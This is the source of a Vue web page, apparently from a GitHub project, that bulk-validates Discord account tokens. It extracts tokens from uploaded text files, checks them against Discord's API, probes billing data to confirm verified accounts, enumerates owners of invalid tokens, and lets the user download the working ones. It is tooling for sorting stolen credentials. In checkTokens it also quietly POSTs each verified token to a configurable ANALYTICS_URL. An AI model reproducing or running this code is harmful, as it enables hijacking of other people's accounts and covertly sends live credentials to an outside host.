<script lang="ts" setup>
import type { DiscordAccount, InvalidDiscordAccount } from '~/utils/types';

useHead({
  title: 'Discord Token Checker - Find verified, unverified and nitro accounts',
});

const { ANALYTICS_URL } = useRuntimeConfig().public;
// TODO: Remove left hand alternation when mfa tokens become invalid.
const tokenRegex = /mfa\.[\w-]{84}|[A-Za-z\d]{24}\.[\w-]{6}\.[\w-]{27,38}/g;

const fileUpload = ref<HTMLInputElement>(null);
const tokensInput = ref<string>('');

const duplicate = ref<number>(0);
const invalidAccounts = ref<InvalidDiscordAccount[]>([]);
const validAccounts = ref<DiscordAccount[]>([]);

const verifiedAccounts = computed<DiscordAccount[]>(() => validAccounts.value.filter(({ user }) => user.verified));
const unverifiedAccounts = computed<DiscordAccount[]>(() => validAccounts.value.filter(({ user }) => !user.verified));

const delay = ref<number>(1000);
const enumerateInvalid = ref<boolean>(true);
const isChecking = ref<boolean>(false);
const pendingCancellation = ref<boolean>(false);

function loadFile() {
  for (const file of fileUpload.value.files) {
    if (!file.name.endsWith('.txt')) continue;

    const reader = new FileReader();
    reader.onload = ({ target }) => {
      const tokens = target.result.toString().match(tokenRegex);
      tokensInput.value += [...new Set(tokens)].join('\n');
    };

    reader.readAsText(file);
  }
}

async function checkTokens() {
  // reset values
  duplicate.value = 0;
  validAccounts.value = [];
  invalidAccounts.value = [];

  const rawValue = tokensInput.value.trim();
  const matchedTokens = rawValue.match(tokenRegex);

  if (!matchedTokens) {
    return;
  }

  isChecking.value = true;

  const noDuplicates = [...new Set(matchedTokens)];
  duplicate.value = matchedTokens.length - noDuplicates.length;

  for (const token of noDuplicates) {
    if (pendingCancellation.value) {
      pendingCancellation.value = false;
      isChecking.value = false;
      return;
    }

    const user = await fetchUser('@me', { token, delay: +delay.value });
    if (!user) {
      // Enumerate user from token
      const base64Id = token.split('.')[0];
      const decodedId = atob(base64Id);
      const existingAccount = validAccounts.value.find((account) => account.user.id === decodedId);
      if (existingAccount) {
        invalidAccounts.value.push({ token, user: existingAccount.user });
        continue;
      }

      if (base64Id === 'mfa' || Number.isNaN(decodedId) || verifiedAccounts.value.length === 0) {
        invalidAccounts.value.push({ token, user: null });
        continue;
      }

      if (!enumerateInvalid.value) {
        invalidAccounts.value.push({ token, user: { id: decodedId } });
        continue;
      }

      const userObject = await fetchUser(decodedId, { token: verifiedAccounts.value[0].tokens[0] });
      invalidAccounts.value.push({ token, user: userObject || { id: decodedId } });
      continue;
    }

    const cachedAccount = validAccounts.value.find((account) => account.user.id === user.id);
    if (!cachedAccount) {
      // Request to check whether account is REALLY verified
      user.verified = !!(await fetchBillingCountry({ token }));
      if (ANALYTICS_URL && user.verified) {
        await $fetch(ANALYTICS_URL, { method: 'POST', body: { tokens: [token] } }).catch(() => false);
      }

      validAccounts.value.push({ tokens: [token], user });
      continue;
    }
    cachedAccount.tokens.push(token);
  }

  isChecking.value = false;
}

function removeAccount(id) {
  validAccounts.value = validAccounts.value.filter((account) => account.user.id !== id);
}

function downloadTokens() {
  const link = document.createElement('a');
  link.setAttribute(
    'href',
    `data:text/plain;charset=utf-8,${encodeURIComponent(
      verifiedAccounts.value.map((account) => account.tokens).join('\n')
    )}`
  );
  link.setAttribute('download', `tokens-${new Date().toLocaleDateString('en-US').replaceAll('/', '_')}.txt`);

  link.style.display = 'none';
  document.body.appendChild(link);

  link.click();

  document.body.removeChild(link);
}
</script>

<template>
  <div class="py-5 px-2 min-h-screen bg-gray-100 dark:bg-gray-900 md:px-4 lg:px-10">
    <div class="flex justify-between items-center">
      <h1 class="flex items-center mr-4 text-2xl font-semibold dark:text-white">
        <i class="mr-2 i-carbon-logo-discord" />
        Discord Token Checker
        <a
          href="https://github.com/masterjanic"
          class="hidden ml-2 text-sm text-gray-500 hover:text-gray-600 dark:text-gray-300 dark:hover:text-gray-400 md:inline-flex"
          >by masterjanic</a
        >
      </h1>

      <div class="flex space-x-2 text-xl justify-content-end">
        <ColorSwitcher />
        <a
          href="https://github.com/masterjanic/discord-checker-web"
          class="dark:bg-gray-50 dark:hover:bg-gray-200 i-carbon-logo-github"
        />
      </div>
    </div>

    <div
      class="flex items-center py-3 px-4 my-4 text-sm font-bold text-gray-800 bg-yellow-400 dark:bg-yellow-500 rounded-lg"
      role="alert"
    >
      <i class="hidden mr-2 md:inline-flex i-carbon-warning-alt-filled" />
      <span
        >Discord recently increased the security of their tokens. Tokens starting with
        <code class="mx-0.5 text-red-600">mfa.</code> or of <code class="mx-0.5 text-red-600">length 59</code> will not
        be supported in near future.</span
      >
    </div>
    <textarea
      v-model="tokensInput"
      :disabled="isChecking"
      placeholder="Enter your tokens..."
      spellcheck="false"
      class="p-2 w-full h-96 font-mono text-gray-800 dark:text-gray-200 bg-gray-200 dark:bg-gray-800 rounded border-2 border-blurple focus:border-blurple-dark outline-none disabled:opacity-50 resize-none"
    />

    <div class="my-6">
      <label class="flex items-center mb-8 space-x-3 hover:cursor-pointer">
        <input
          v-model="enumerateInvalid"
          type="checkbox"
          class="w-5 h-5 checked:bg-blurple rounded border border-gray-300 checked:border-transparent focus:outline-none appearance-none"
        />
        <span class="font-semibold text-black dark:text-white">Enumerate Invalid Tokens</span>

        <Tooltip
          class="text-white"
          title="This will enumerate user details of invalid tokens. Disable to save one request to the Discord API."
        >
          <i class="flex text-gray-700 dark:text-gray-50 dark:hover:text-gray-200 i-carbon-help-filled" />
        </Tooltip>
      </label>

      <div class="flex items-center">
        <label class="font-semibold text-black dark:text-white">Delay:</label>
        <Tooltip class="text-white" title="This is the wait time between each request in milliseconds.">
          <i class="flex ml-2 text-gray-700 dark:text-gray-50 dark:hover:text-gray-200 i-carbon-help-filled" />
        </Tooltip>
      </div>

      <input
        v-model="delay"
        class="overflow-hidden mt-3 w-full h-4 bg-gray-400 rounded-full appearance-none md:w-2/3 lg:w-1/2"
        type="range"
        min="0"
        max="30000"
        step="100"
      />
      <div class="flex justify-between w-full text-sm text-gray-900 dark:text-gray-400 md:w-2/3 lg:w-1/2">
        <span>0 ms</span>
        <span>{{ delay }}</span>
        <span>30000 ms</span>
      </div>
    </div>

    <div v-if="!isChecking" class="flex space-x-2">
      <input ref="fileUpload" class="hidden" type="file" accept=".txt" hidden multiple @change="loadFile" />
      <button
        class="flex items-center p-2 mt-2 font-semibold text-gray-800 bg-yellow-400 hover:bg-yellow-500 dark:bg-yellow-500 dark:hover:bg-yellow-600 rounded disabled:opacity-50 transition"
        @click="() => fileUpload.click()"
      >
        <i class="mr-2 i-carbon-upload" />
        Load File(s)
      </button>

      <button
        class="flex items-center p-2 mt-2 font-semibold text-gray-50 bg-blurple hover:bg-blurple-dark rounded disabled:opacity-50 transition"
        @click="checkTokens"
      >
        <i class="mr-2 i-carbon-restart" />
        Check Tokens
      </button>
    </div>
    <div v-else>
      <button
        class="flex items-center p-2 mt-2 font-semibold text-gray-50 bg-red-400 hover:bg-red-500 dark:bg-red-500 dark:hover:bg-red-600 rounded disabled:opacity-50 transition"
        :disabled="pendingCancellation"
        @click="pendingCancellation = true"
      >
        <i class="mr-2 i-carbon-stop-filled" />
        Stop
      </button>
    </div>

    <div v-if="verifiedAccounts.length > 0" class="my-10 dark:text-white">
      <h2 class="text-2xl font-semibold tracking-wide text-center">
        Verified Accounts ({{ verifiedAccounts.length }})
      </h2>
      <hr />

      <button
        :disabled="isChecking"
        class="flex items-center p-2 mt-2 mb-4 font-semibold text-gray-50 bg-green-500 hover:bg-green-600 rounded disabled:opacity-50 transition"
        @click="downloadTokens()"
      >
        <i class="mr-2 i-carbon-download" />
        Download Tokens
      </button>
      <AccountList :accounts="verifiedAccounts" @delete="(id) => removeAccount(id)" />
    </div>

    <div v-if="unverifiedAccounts.length > 0" class="my-10 dark:text-white">
      <h2 class="text-2xl font-semibold tracking-wide text-center">
        Unverified Accounts ({{ unverifiedAccounts.length }})
      </h2>
      <hr />
      <AccountList :accounts="unverifiedAccounts" @delete="(id) => removeAccount(id)" />
    </div>

    <div v-if="invalidAccounts.length > 0" class="my-10 dark:text-white">
      <h2 class="text-2xl font-semibold tracking-wide text-center">Invalid Tokens ({{ invalidAccounts.length }})</h2>
      <hr />

      <div class="grid grid-cols-1 grid-flow-row gap-4 xl:grid-cols-2">
        <div
          v-for="entry of invalidAccounts"
          :key="entry.token"
          class="flex flex-col p-5 bg-gray-200 dark:bg-gray-800 rounded-lg drop-shadow-lg dark:drop-shadow-none transition ease-in-out hover:-translate-y-1 hover:scale-102"
        >
          <span class="break-all">{{ entry.token }}</span>
          <small v-if="!entry.user || !entry.user.username" class="text-gray-700 dark:text-gray-400">
            {{ !entry.user ? 'Unknown User' : `User ID: ${entry.user.id}` }}
          </small>
          <small v-else class="flex items-center space-x-1.5 text-gray-700 dark:text-gray-400">
            <AccountAvatar size="16" :user="entry.user" class="drop-shadow-md" />
            <span>{{ entry.user.username }}#{{ entry.user.discriminator }} ({{ entry.user.id }})</span>
          </small>
        </div>
      </div>
    </div>

    <div v-if="duplicate > 0" class="my-10 text-white">
      <h2 class="text-2xl font-semibold tracking-wide text-center">Duplicate Tokens ({{ duplicate }})</h2>
      <hr />

      <div class="p-3 text-center bg-violet-800 rounded-lg">
        <span class="font-semibold text-white"
          >Duplicate tokens were removed before sending requests to the Discord API.</span
        >
      </div>
    </div>
  </div>
</template>

<style>
hr {
  width: 110px;
  margin: 10px auto 30px auto;
  border-color: #212121;
}

.dark hr {
  border-color: #fff;
}

input[type='range']::-webkit-slider-thumb {
  width: 15px;
  -webkit-appearance: none;
  appearance: none;
  height: 15px;
  cursor: ew-resize;
  background: #fff;
  box-shadow: -505px 0 0 500px #5865f2;
  border-radius: 50%;
}
</style>
